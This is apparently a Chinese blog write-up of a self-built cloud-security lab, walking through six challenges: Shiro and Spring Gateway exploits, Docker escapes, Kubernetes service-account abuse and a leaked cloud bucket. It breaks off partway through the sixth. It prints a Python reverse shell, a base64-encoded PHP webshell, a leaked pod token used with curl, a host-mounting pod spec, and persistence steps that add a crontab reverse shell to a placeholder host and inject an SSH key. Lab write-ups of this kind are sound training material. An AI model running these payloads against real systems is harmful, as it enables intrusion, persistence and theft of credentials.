<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8" />
<title>
    
</title>
<!--[if lt IE 9]><script src="//cdn.bootcss.com/html5shiv/r29/html5.js"></script><![endif]-->
<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
<meta http-equiv="x-dns-prefetch-control" content="on">
<link rel="dns-prefetch" href="https://cdn.jsdelivr.net">
<meta name="author" content="loecho">
<meta name="description" content="安全行业的从业人员">
<meta name="keywords" content="">
<script async src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
<link rel="stylesheet" href="https://1oecho.github.io/styles/main.css" />
<link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
<script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/1.7.1/jquery.min.js"></script>

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/css/style.min.css" />
    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/tocbot.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/script.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/icon.min.js"></script>
    
            <script src="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@1.0.12/CDN/js/Card/prism.min.js"></script>
            <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@1.0.12/CDN/css/Card/prism.min.css" />
            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.css">
            <script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.js"></script>
            
                <!--点击特效-->
                <script src="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/js/love.min.js"></script>
                
                        <!--CDN样式-->
                        <script src="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/js/hit-kounter-lc-0.3.0.js"></script>
                        <script src="https://cdn1.lncld.net/static/js/av-min-1.5.0.js"></script>
                        
                            <script>
                                (function() {
                                    var bp = document.createElement('script');
                                    var curProtocol = window.location.protocol.split(':')[0];
                                    if (curProtocol === 'https') {
                                        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
                                    } else {
                                        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
                                    }
                                    var s = document.getElementsByTagName("script")[0];
                                    s.parentNode.insertBefore(bp, s);
                                })();
                            </script>
                            
</head>

<body>
    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo">
                <a href="https://1oecho.github.io">
                    
                </a>
            </div>

            <div class="menu navbar-right">
                
                    <a class="menu-item" href="https://1oecho.github.io/NoteBook">
                        Index
                    </a>
                    
                    <a class="menu-item" href="https://1oecho.github.io/tags">
                        Tags
                    </a>
                    
                    <a class="menu-item" href="https://github.com/loecho-sec">
                        Whoami
                    </a>
                    
                        <input id="switch_default" type="checkbox" class="switch_default">
                        <label for="switch_default" class="toggleBtn"></label>
            </div>
            <form id="gridea-search-form" data-update="1702539383157" action="/search/index.html">
                <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
            </form>
        </div>
    </nav>

    
        <nav class="navbar-mobile" id="nav-mobile">
            <div class="container">
                <div class="navbar-header">
                    <div>
                        <a href="https://1oecho.github.io">
                            
                        </a>
                        <!--en-->
                        <a id="mobile-toggle-theme-en" class="a en">&nbsp;Dark</a>
                        <!--zh-->
                        <a id="mobile-toggle-theme-zh" class="a zh">&nbsp;&#x6697;&#x9ED1;</a>
                    </div>
                    <form id="gridea-search-form" data-update="1702539383157" action="/search/index.html">
                        <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
                    </form>
                    <!--en-->
                    <div class="menu-toggle" id="menu-toggle-en" onclick="mobileBtn()">&#9776; Menu</div>
                    <!--zh-->
                    <div class="menu-toggle" id="menu-toggle-zh" onclick="mobileBtn()">&#9776; &#x83DC;&#x5355;</div>

                </div>
                <div class="menu" id="mobile-menu">
                    
                        <a class="menu-item" href="https://1oecho.github.io/NoteBook">
                            Index
                        </a>
                        
                        <a class="menu-item" href="https://1oecho.github.io/tags">
                            Tags
                        </a>
                        
                        <a class="menu-item" href="https://github.com/loecho-sec">
                            Whoami
                        </a>
                        
                </div>
            </div>
        </nav>
</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementById("menu-toggle-en");
        var toggleMenu_zh = document.getElementById("menu-toggle-zh");

        var mobileMenu = document.getElementById("mobile-menu");
        if (toggleMenu.display != "none") {
            if (toggleMenu.classList.contains("active")) {
                toggleMenu.classList.remove("active")
                mobileMenu.classList.remove("active")
            } else {
                toggleMenu.classList.add("active")
                mobileMenu.classList.add("active")
            }
        } else if (toggleMenu_zh.display != "none") {
            if (toggleMenu_zh.classList.contains("active")) {
                toggleMenu_zh.classList.remove("active")
                mobileMenu.classList.remove("active")
            } else {
                toggleMenu_zh.classList.add("active")
                mobileMenu.classList.add("active")
            }
        }

    }
</script>
            <div class="main">
                <div class="container">
                    <article class="post-wrap">
                        <header class="post-header">
                            <h1 class="post-title">
                                云安全: 云安全自建靶场答题记录
                            </h1>
                            
                                    <!--zh-->
                                    <div class="post-meta zh">
                                        &#x4F5C;&#x8005;:
                                        <a itemprop="author" rel="author" href="/">
                                            
                                        </a>
                                        <span class="post-time">&#x65E5;&#x671F;: <a href="#">2023-11-21</a></span>
                                        <span class="post-readtime">&#x9605;&#x8BFB;&#x65F6;&#x95F4;:<a
                                    href="#">7.4
                                    &#x5206;&#x949F;</a></span>
                                        <span class="post-words">&#x5B57;&#x6570;:<a href="#">1789</a></span>
                                        
                                            <span class="post-category">&#x5206;&#x7C7B;:
                                
                                <a href="https://1oecho.github.io/r2rd6ViBp/">云安全</a>
                                
                            </span>
                                            
                                                阅读量:
                                                <span data-hk-page="current"> - </span>
                                                
                                    </div>
                                    
                        </header>
                        
                        <div class="post-content">
                            <h2 id="题目一-云之影shiro的秘密">题目一 云之影：Shiro的秘密</h2>
<h3 id="题目信息">题目信息：</h3>
<ul>
<li>
<p>命令执行</p>
</li>
<li>
<p>信息收集</p>
</li>
<li>
<p>云服务</p>
</li>
</ul>
<h3 id="解题步骤包含关键步骤截图">解题步骤（包含关键步骤截图：）</h3>
<ol>
<li>端口扫描：</li>
</ol>
<figure data-type="image" tabindex="1"><img src="https://p.ipic.vip/z4fk8y.png" alt="img" loading="lazy"></figure>
<p>2.访问8080端口，指纹识别shiro框架，尝试shiro550 反序列化漏洞</p>
<figure data-type="image" tabindex="2"><img src="https://p.ipic.vip/ok65ae.png" alt="img" loading="lazy"></figure>
<p>存在漏洞，漏洞利用成功，获取webshell：</p>
<figure data-type="image" tabindex="3"><img src="https://p.ipic.vip/mbj0fa.png" alt="img" loading="lazy"></figure>
<figure data-type="image" tabindex="4"><img src="https://p.ipic.vip/1ol63u.png" alt="img" loading="lazy"></figure>
<figure data-type="image" tabindex="5"><img src="https://p.ipic.vip/dl05e4.png" alt="img" loading="lazy"></figure>
<p>获取到遗留的配置文件，base64解码：</p>
<figure data-type="image" tabindex="6"><img src="https://p.ipic.vip/y0cq80.png" alt="img" loading="lazy"></figure>
<p>直接访问显示AccesDenied：</p>
<figure data-type="image" tabindex="7"><img src="https://p.ipic.vip/wkjph1.png" alt="img" loading="lazy"></figure>
<p>根据提示猜想，可能设置了权限，只有入口主机能访问，尝试访问，访问成功：</p>
<figure data-type="image" tabindex="8"><img src="https://p.ipic.vip/kr9ihj.png" alt="img" loading="lazy"></figure>
<p>Flag2 获取成功：</p>
<figure data-type="image" tabindex="9"><img src="https://p.ipic.vip/6x6g1j.png" alt="img" loading="lazy"></figure>
<p>信息收集，查看所有有效用户：</p>
<figure data-type="image" tabindex="10"><img src="https://p.ipic.vip/x3o07u.png" alt="img" loading="lazy"></figure>
<p>查看ubuntu用户的用户文件夹, 发现db_old文件夹：</p>
<figure data-type="image" tabindex="11"><img src="https://p.ipic.vip/vvs5ta.png" alt="img" loading="lazy"></figure>
<figure data-type="image" tabindex="12"><img src="https://p.ipic.vip/tv4oa6.png" alt="img" loading="lazy"></figure>
<p>发现只有数据库名，没有其他信息：</p>
<figure data-type="image" tabindex="13"><img src="https://p.ipic.vip/t89e0i.png" alt="img" loading="lazy"></figure>
<p>查看用户的.bash_history 发现敏感操作：</p>
<figure data-type="image" tabindex="14"><img src="https://p.ipic.vip/p5j56a.png" alt="img" loading="lazy"></figure>
<p>Base64解码获取到密码：</p>
<figure data-type="image" tabindex="15"><img src="https://p.ipic.vip/n1vrqk.png" alt="img" loading="lazy"></figure>
<p>尝试登陆,登陆失败，继续查看.bash_history, 发现另一个端口：</p>
<figure data-type="image" tabindex="16"><img src="https://p.ipic.vip/ryx96c.png" alt="img" loading="lazy"></figure>
<p>登陆成功：</p>
<figure data-type="image" tabindex="17"><img src="https://p.ipic.vip/yplfkm.png" alt="img" loading="lazy"></figure>
<p>获取flag3:</p>
<figure data-type="image" tabindex="18"><img src="https://p.ipic.vip/quyczf.png" alt="img" loading="lazy"></figure>
<h2 id="题目二-云端回响spring的遗憾">题目二 云端回响：Spring的遗憾</h2>
<h3 id="题目信息-2">题目信息：</h3>
<p>Spring 微服务</p>
<p>SDK</p>
<p>腾讯云</p>
<h3 id="解题步骤包含关键步骤截图-2">解题步骤（包含关键步骤截图：）</h3>
<p>端口扫描：</p>
<figure data-type="image" tabindex="19"><img src="https://p.ipic.vip/egjcfg.png" alt="img" loading="lazy"></figure>
<p>访问8080端口， 指纹识别名没有信息：</p>
<figure data-type="image" tabindex="20"><img src="https://p.ipic.vip/4b3549.png" alt="img" loading="lazy"></figure>
<p>尝试目录扫描 获取到目标存在Spring Actuator 未授权访问漏洞，：</p>
<figure data-type="image" tabindex="21"><img src="https://p.ipic.vip/140k43.png" alt="img" loading="lazy"></figure>
<p>访问路径，发现存在gateway，尝试CVE-2022-22947漏洞</p>
<figure data-type="image" tabindex="22"><img src="https://p.ipic.vip/y7tmt1.png" alt="img" loading="lazy"></figure>
<p>Github搜索关键字获取工具：</p>
<p>https://github.com/aodsec/CVE-2022-22947</p>
<p>执行成功：</p>
<figure data-type="image" tabindex="23"><img src="https://p.ipic.vip/lb1nv3.png" alt="img" loading="lazy"></figure>
<p>反弹shell成功：</p>
<figure data-type="image" tabindex="24"><img src="https://p.ipic.vip/29d3kf.png" alt="img" loading="lazy"></figure>
<figure data-type="image" tabindex="25"><img src="https://p.ipic.vip/bi1iwk.png" alt="img" loading="lazy"></figure>
<p>获取第一个flag：</p>
<figure data-type="image" tabindex="26"><img src="https://p.ipic.vip/leax5l.png" alt="img" loading="lazy"></figure>
<p>信息收集，查看ubuntu用户的.bash_history:</p>
<figure data-type="image" tabindex="27"><img src="https://p.ipic.vip/9qqj89.png" alt="img" loading="lazy"></figure>
<p>执行命令后获取ak和sk：</p>
<figure data-type="image" tabindex="28"><img src="https://p.ipic.vip/sdsi7j.png" alt="img" loading="lazy"></figure>
<p>通过cf利用：</p>
<p>配置ak/sk 选择腾讯云</p>
<figure data-type="image" tabindex="29"><img src="https://p.ipic.vip/9dar49.png" alt="img" loading="lazy"></figure>
<p>接管控制台</p>
<figure data-type="image" tabindex="30"><img src="https://p.ipic.vip/flz57h.png" alt="img" loading="lazy"></figure>
<p>登陆控制台</p>
<p>查看具体资源，对象存储有资源：</p>
<figure data-type="image" tabindex="31"><img src="https://p.ipic.vip/13jltz.png" alt="img" loading="lazy"></figure>
<p>查看cloud-2-flag2对象存储获取flag2:</p>
<figure data-type="image" tabindex="32"><img src="https://p.ipic.vip/9kasfb.png" alt="img" loading="lazy"></figure>
<p>查看cloud-3-flag3对象存储获取flag3</p>
<figure data-type="image" tabindex="33"><img src="https://p.ipic.vip/gnx0i2.png" alt="img" loading="lazy"></figure>
<h2 id="题目三-云端之影docker的双重背叛">题目三 云端之影：Docker的双重背叛</h2>
<h3 id="题目信息-3">题目信息：</h3>
<p>Docker 文件管理 逃逸</p>
<h3 id="解题步骤包含关键步骤截图-3">解题步骤（包含关键步骤截图：）</h3>
<p>端口扫描：</p>
<figure data-type="image" tabindex="34"><img src="https://p.ipic.vip/qq2lgu.png" alt="img" loading="lazy"></figure>
<p>访问80端口：</p>
<figure data-type="image" tabindex="35"><img src="https://p.ipic.vip/el5zdh.png" alt="img" loading="lazy"></figure>
<p>尝试下主页功能，都是无效功能，目录扫描：</p>
<figure data-type="image" tabindex="36"><img src="https://p.ipic.vip/uvsyho.png" alt="img" loading="lazy"></figure>
<p>存在upload.php，访问尝试, 上传php webshell：</p>
<figure data-type="image" tabindex="37"><img src="https://p.ipic.vip/v2bi0g.png" alt="img" loading="lazy"></figure>
<p>冰蝎链接成功，获取Flag1：</p>
<figure data-type="image" tabindex="38"><img src="https://p.ipic.vip/uwo8ko.png" alt="img" loading="lazy"></figure>
<p>信息收集发现发现，当前环境为docker环境无k8s集群：</p>
<figure data-type="image" tabindex="39"><img src="https://p.ipic.vip/ha47ev.png" alt="img" loading="lazy"></figure>
<p>CDK信息收集 存在docker.sock 挂载：</p>
<figure data-type="image" tabindex="40"><img src="https://p.ipic.vip/5e4exa.png" alt="img" loading="lazy"></figure>
<p>反弹shell 手工利用</p>
<figure data-type="image" tabindex="41"><img src="https://p.ipic.vip/ebhjgi.png" alt="img" loading="lazy"></figure>
<p>挂载宿主机根目录。获取宿主机权限，获取flag2：</p>
<figure data-type="image" tabindex="42"><img src="https://p.ipic.vip/9j9r4p.png" alt="img" loading="lazy"></figure>
<p>Docker ps 查看所有容器，发现flag-container-image 镜像的Docker</p>
<p>直接进入对应Docker，获取Flag3</p>
<figure data-type="image" tabindex="43"><img src="https://p.ipic.vip/kxg1zu.png" alt="img" loading="lazy"></figure>
<h2 id="题目四-云端之谜docker的隐藏秘密">题目四 云端之谜：Docker的隐藏秘密</h2>
<h3 id="题目信息-4">题目信息：</h3>
<p>python后门Docker 逃逸</p>
<h3 id="解题步骤包含关键步骤截图-4">解题步骤（包含关键步骤截图：）</h3>
<p>端口扫描：</p>
<figure data-type="image" tabindex="44"><img src="https://p.ipic.vip/zh77py.png" alt="img" loading="lazy"></figure>
<p>访问8080端口：</p>
<figure data-type="image" tabindex="45"><img src="https://p.ipic.vip/cjum2q.png" alt="img" loading="lazy"></figure>
<p>查看页面源代码：</p>
<figure data-type="image" tabindex="46"><img src="https://p.ipic.vip/3awomk.png" alt="img" loading="lazy"></figure>
<p>通过路由获取系统备份：</p>
<figure data-type="image" tabindex="47"><img src="https://p.ipic.vip/9gynlt.png" alt="img" loading="lazy"></figure>
<p>代码审计发现，系统存在命令执行后门：</p>
<figure data-type="image" tabindex="48"><img src="https://p.ipic.vip/6zzdrr.png" alt="img" loading="lazy"></figure>
<p>列目录获取flag1:</p>
<figure data-type="image" tabindex="49"><img src="https://p.ipic.vip/uuv0qf.png" alt="img" loading="lazy"></figure>
<figure data-type="image" tabindex="50"><img src="https://p.ipic.vip/z9wju3.png" alt="img" loading="lazy"></figure>
<p>信息收集，当前环境为单docker，无k8s集群：</p>
<figure data-type="image" tabindex="51"><img src="https://p.ipic.vip/mpr8z4.png" alt="img" loading="lazy"></figure>
<p>Python环境不能写webshell，我们直接将CDK下载进去：</p>
<figure data-type="image" tabindex="52"><img src="https://p.ipic.vip/yapu6k.png" alt="img" loading="lazy"></figure>
<figure data-type="image" tabindex="53"><img src="https://p.ipic.vip/ajzqyn.png" alt="img" loading="lazy"></figure>
<figure data-type="image" tabindex="54"><img src="https://p.ipic.vip/91a6zj.png" alt="img" loading="lazy"></figure>
<p>收集docker信息 发现存在特权，直接利用特权进行逃逸：</p>
<figure data-type="image" tabindex="55"><img src="https://p.ipic.vip/gar1ib.png" alt="img" loading="lazy"></figure>
<p>手工确认：</p>
<figure data-type="image" tabindex="56"><img src="https://p.ipic.vip/uodqie.png" alt="img" loading="lazy"></figure>
<p>反弹一个shell来深入利用</p>
<pre><code class="language-python">python3 -c 'import os,pty,socket;s=socket.socket();s.connect((&quot;xxxxxxx&quot;,9999));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;/bin/bash&quot;)'
</code></pre>
<figure data-type="image" tabindex="57"><img src="https://p.ipic.vip/d0cdkf.png" alt="img" loading="lazy"></figure>
<p>挂载宿主机硬盘到docker里</p>
<pre><code class="language-bash">mkdir /tmp/mnt
mount /dev/sda1 /tmp/mnt
cd /tmp/mnt
</code></pre>
<p>查看宿主根目录，获取flag2</p>
<figure data-type="image" tabindex="58"><img src="https://p.ipic.vip/9pztha.png" alt="img" loading="lazy"></figure>
<p>因为我们已经获取了宿主机的硬盘权限，直接搜索flag3关键字，即可从宿主机文件系统，读到另一个docker的文件</p>
<figure data-type="image" tabindex="59"><img src="https://p.ipic.vip/1zm7pn.png" alt="img" loading="lazy"></figure>
<h2 id="题目五-云端迷宫kubernetes之旅">题目五 云端迷宫：Kubernetes之旅</h2>
<h3 id="题目信息-5">题目信息:</h3>
<ul>
<li>
<p>RCE</p>
</li>
<li>
<p>K8s</p>
</li>
<li>
<p>ServiceAccount</p>
</li>
</ul>
<h3 id="解题步骤包含关键步骤截图-5">解题步骤（包含关键步骤截图：）</h3>
<p>直接访问：</p>
<p>http://ngrok.xiaomiqiu123.top:43248/</p>
<p>手工测试后，发现是一个无显的命令执行漏洞：</p>
<figure data-type="image" tabindex="60"><img src="https://p.ipic.vip/94mbyz.png" alt="img" loading="lazy"></figure>
<p>随意输入命令，报错获取到绝对路径，可以直接写入webshell：</p>
<figure data-type="image" tabindex="61"><img src="https://p.ipic.vip/rzsfx8.png" alt="img" loading="lazy"></figure>
<p>直接echo 写入一个冰蝎马：</p>
<pre><code class="language-bash">echo PD9waHAKQGVycm9yX3JlcG9ydGluZygwKTsKCWZ1bmN0aW9uIERlY3J5cHQoJGRhdGEpCnsKICAgICRrZXk9ImU0NWUzMjlmZWI1ZDkyNWIiOyAKICAgICRicz0iYmFzZTY0XyIuImRlY29kZSI7CgkkYWZ0ZXI9JGJzKCRkYXRhLiIiKTsKCWZvcigkaT0wOyRpPHN0cmxlbigkYWZ0ZXIpOyRpKyspIHsKICAgIAkkYWZ0ZXJbJGldID0gJGFmdGVyWyRpXV4ka2V5WyRpKzEmMTVdOyAKICAgIH0KICAgIHJldHVybiAkYWZ0ZXI7Cn0KCSRwb3N0PURlY3J5cHQoZmlsZV9nZXRfY29udGVudHMoInBocDovL2lucHV0IikpOwogICAgZXZhbCgkcG9zdCk7Cj8+ | base64 -d &gt; /var/www/html/oooooo.php
</code></pre>
<p>连接成功：</p>
<figure data-type="image" tabindex="62"><img src="https://p.ipic.vip/3p48xr.png" alt="img" loading="lazy"></figure>
<p>搜索flag1:</p>
<figure data-type="image" tabindex="63"><img src="https://p.ipic.vip/pyf6cz.png" alt="img" loading="lazy"></figure>
<figure data-type="image" tabindex="64"><img src="https://p.ipic.vip/42k4s3.png" alt="img" loading="lazy"></figure>
<p>信息收集, 发现我们目前处于一个k8s的pod当中:</p>
<p>cat /proc/1/cgroup</p>
<figure data-type="image" tabindex="65"><img src="https://p.ipic.vip/km0r12.png" alt="img" loading="lazy"></figure>
<p>查看env信息</p>
<figure data-type="image" tabindex="66"><img src="https://p.ipic.vip/hsklek.png" alt="img" loading="lazy"></figure>
<p>我们查看当前pod的服务账户Token:</p>
<figure data-type="image" tabindex="67"><img src="https://p.ipic.vip/uov0ax.png" alt="img" loading="lazy"></figure>
<pre><code>eyJhbGciOiJSUzI1NiIsImtpZCI6InNUSExVVHNuaVBocTN5eU1mWEtlbTdNRUlzLVRhblM5dDhiZmJuSlJ1d1EifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzI5MTA2NjAxLCJpYXQiOjE2OTc1NzA2MDEsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJ3ZWItYXBwLTc3ZmJmNjU3NmItcDR3eGQiLCJ1aWQiOiJlODZiM2I4Zi1iNzlmLTRjMDctODBjZS01Zjk2MmYwOTE0MmQifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6IndlYi1hcHAtc2EiLCJ1aWQiOiJlM2JiOGI4MC02NDk5LTQ1MWItOGZmYi1kNDczMzc0NGQ2MGYifSwid2FybmFmdGVyIjoxNjk3NTc0MjA4fSwibmJmIjoxNjk3NTcwNjAxLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6ZGVmYXVsdDp3ZWItYXBwLXNhIn0.WtbuPrZpCvttzmBY8BJXzThzBtivxf8GboxNYwpPsMN0XYF5EtA1aGs1hWAWI4zupeV5z-XZWOeulDrkXIB6e1qiMVFvdAZXH6S0O79GlIOd9PwPNgPHDmn3d0Lm1zNFjJN6RVHI50ZvFfZt3W0YuGGnPfEjbX536TWA0DrARV94q976-PtwObjuW-Ef03KRNwTsKCU7x6CoviVidNefwlGmw0w8rkO96dJJqLp97rScy615XkaUrSuT0iHnjXy4iBrXZINcJxSt4SpgKdIdli749YjzN3ivU-iGdbsi6q5S6tehGqAvHJUSdqNOerNhcL0T1eGHcaxBmwAFevzYcA
</code></pre>
<p>先获取Service相关信息：</p>
<figure data-type="image" tabindex="68"><img src="https://p.ipic.vip/jkd54v.png" alt="img" loading="lazy"></figure>
<p>我们通过获取到的token 列一下pod：发现存在utility-pod</p>
<pre><code class="language-bash">curl -s -k -H &quot;Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6InNUSExVVHNuaVBocTN5eU1mWEtlbTdNRUlzLVRhblM5dDhiZmJuSlJ1d1EifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzI5MTA2NjAxLCJpYXQiOjE2OTc1NzA2MDEsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJ3ZWItYXBwLTc3ZmJmNjU3NmItcDR3eGQiLCJ1aWQiOiJlODZiM2I4Zi1iNzlmLTRjMDctODBjZS01Zjk2MmYwOTE0MmQifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6IndlYi1hcHAtc2EiLCJ1aWQiOiJlM2JiOGI4MC02NDk5LTQ1MWItOGZmYi1kNDczMzc0NGQ2MGYifSwid2FybmFmdGVyIjoxNjk3NTc0MjA4fSwibmJmIjoxNjk3NTcwNjAxLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6ZGVmYXVsdDp3ZWItYXBwLXNhIn0.WtbuPrZpCvttzmBY8BJXzThzBtivxf8GboxNYwpPsMN0XYF5EtA1aGs1hWAWI4zupeV5z-XZWOeulDrkXIB6e1qiMVFvdAZXH6S0O79GlIOd9PwPNgPHDmn3d0Lm1zNFjJN6RVHI50ZvFfZt3W0YuGGnPfEjbX536TWA0DrARV94q976-PtwObjuW-Ef03KRNwTsKCU7x6CoviVidNefwlGmw0w8rkO96dJJqLp97rScy615XkaUrSuT0iHnjXy4iBrXZINcJxSt4SpgKdIdli749YjzN3ivU-iGdbsi6q5S6tehGqAvHJUSdqNOerNhcL0T1eGHcaxBmwAFevzYcA&quot; https://10.96.0.1/api/v1/namespaces/default/pods
</code></pre>
<figure data-type="image" tabindex="69"><img src="https://p.ipic.vip/fo4s9r.png" alt="img" loading="lazy"></figure>
<p>查看下这个pod的详细信息,发现信息：</p>
<pre><code class="language-bash">curl -s -k -H &quot;Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6InNUSExVVHNuaVBocTN5eU1mWEtlbTdNRUlzLVRhblM5dDhiZmJuSlJ1d1EifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzI5MTA2NjAxLCJpYXQiOjE2OTc1NzA2MDEsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJ3ZWItYXBwLTc3ZmJmNjU3NmItcDR3eGQiLCJ1aWQiOiJlODZiM2I4Zi1iNzlmLTRjMDctODBjZS01Zjk2MmYwOTE0MmQifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6IndlYi1hcHAtc2EiLCJ1aWQiOiJlM2JiOGI4MC02NDk5LTQ1MWItOGZmYi1kNDczMzc0NGQ2MGYifSwid2FybmFmdGVyIjoxNjk3NTc0MjA4fSwibmJmIjoxNjk3NTcwNjAxLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6ZGVmYXVsdDp3ZWItYXBwLXNhIn0.WtbuPrZpCvttzmBY8BJXzThzBtivxf8GboxNYwpPsMN0XYF5EtA1aGs1hWAWI4zupeV5z-XZWOeulDrkXIB6e1qiMVFvdAZXH6S0O79GlIOd9PwPNgPHDmn3d0Lm1zNFjJN6RVHI50ZvFfZt3W0YuGGnPfEjbX536TWA0DrARV94q976-PtwObjuW-Ef03KRNwTsKCU7x6CoviVidNefwlGmw0w8rkO96dJJqLp97rScy615XkaUrSuT0iHnjXy4iBrXZINcJxSt4SpgKdIdli749YjzN3ivU-iGdbsi6q5S6tehGqAvHJUSdqNOerNhcL0T1eGHcaxBmwAFevzYcA&quot; https://10.96.0.1/api/v1/namespaces/default/pods/utility-pod-7bf9988594-x9ls4
</code></pre>
<figure data-type="image" tabindex="70"><img src="https://p.ipic.vip/gonhcw.png" alt="img" loading="lazy"></figure>
<figure data-type="image" tabindex="71"><img src="https://p.ipic.vip/4so2mw.png" alt="img" loading="lazy"></figure>
<p>Flag2 和Flag3 都在这个pod里，所以我们的目的就是横向到这个pod</p>
<figure data-type="image" tabindex="72"><img src="https://p.ipic.vip/njx4v1.png" alt="img" loading="lazy"></figure>
<ul>
<li>下载kubectl到pod中,直接指定信息操作</li>
</ul>
<p>通过命令指定token以及对应的api的地址,进行远程操控pod.横向到目标pod即可:</p>
<ul>
<li>查看POD</li>
</ul>
<pre><code class="language-bash">kubectl get pods --server=https://&lt;api-server-url&gt; --token=&lt;Service Account Token&gt; 
</code></pre>
<ul>
<li>操作POD:</li>
</ul>
<pre><code class="language-ba">kubectl exec -it utility-pod  bash --server=https://&lt;api-server-url&gt; --token=&lt;Service Account Token&gt; 
</code></pre>
<figure data-type="image" tabindex="73"><img src="https://p.ipic.vip/a0162p.png" alt="img" loading="lazy"></figure>
<p>后续可以继续利用,权限足够的话:</p>
<p>创建特权pod 挂载实体机/ 到 特权pod的 /mnt</p>
<pre><code class="language-bash">kubectl apply -f app.yaml  --server=https://&lt;api-server-url&gt; --token=&lt;Service Account Token&gt;
</code></pre>
<ul>
<li>app.yaml</li>
</ul>
<pre><code class="language-yaml">apiVersion: v1

kind: Pod

metadata:

  name: app

spec:

  containers:

  - image: nginx

    name: test-container

    volumeMounts:

    - mountPath: /mnt

      name: test-volume

  volumes:

  - name: test-volume

    hostPath:

      path: /

</code></pre>
<p>进入我们创建的特权token 进/mnt 目录</p>
<ul>
<li>kubectl  exec -it app /bin/bash --server=https://<api-server-url> --token=<Service Account Token></li>
</ul>
<p>后渗透:</p>
<pre><code>// 1. 向 crontab 写入反弹 shell 的定时任务

# echo -e &quot;* * * * * root bash -i &gt;&amp; /dev/tcp/x.x.x.x/8888 0&gt;&amp;1n&quot; &gt;&gt; /mnt/etc/crontab

// 2. 写入SSH公钥直接连接：

echo &quot;ssh-rsa 123&quot; &gt;&gt; /mnt/root/.ssh/authorized_keys

</code></pre>
<h2 id="题目六-环环相扣">题目六 环环相扣</h2>
<h3 id="题目信息-6">题目信息：</h3>
<p>某个应用的备份文件存在泄漏，泄漏在了COS上，已知信息如下：</p>
<p>服务商: 腾讯云</p>
<p>前缀: backupdata-1318326636</p>
<p>位置：ap-shanghai</p>
<p>文件名：app-pom.xml</p>
<p>Xstream</p>
<p>RCE</p>
<p>Docker</p>
<h3 id="解题步骤包含关键步骤截图-6">解题步骤（包含关键步骤截图：）</h3>
<p>通过题目的提示我们能猜出目标的COS地址：</p>
<p>https://backupdata-1318326636.cos.ap-shanghai.myqcloud.com/</p>
<figure data-type="image" tabindex="74"><img src="https://p.ipic.vip/1m8qd5.png" alt="img" loading="lazy"></figure>
<p>根据提示构造下文件名,获取到文件内容，注释包含一个IP，看文件接口是java系统的Mvn的pom.xml文件：</p>
<p>从配置文件获取的 依赖有springBoot以及Xstream</p>
<figure data-type="image" tabindex="75"><img src="https://p.ipic.vip/l2xpcp.png" alt="img" loading="lazy"></figure>
<p>端口扫描下注释里的IP地址：</p>
<figure data-type="image" tabindex="76"><img src="https://p.ipic.vip/dp529v.png" alt="img" loading="lazy"></figure>
<p>访问端口8080：</p>
<p>随便构造一个xml 爆500 猜测可能直接是通过Content-Type来直接解析xml：</p>
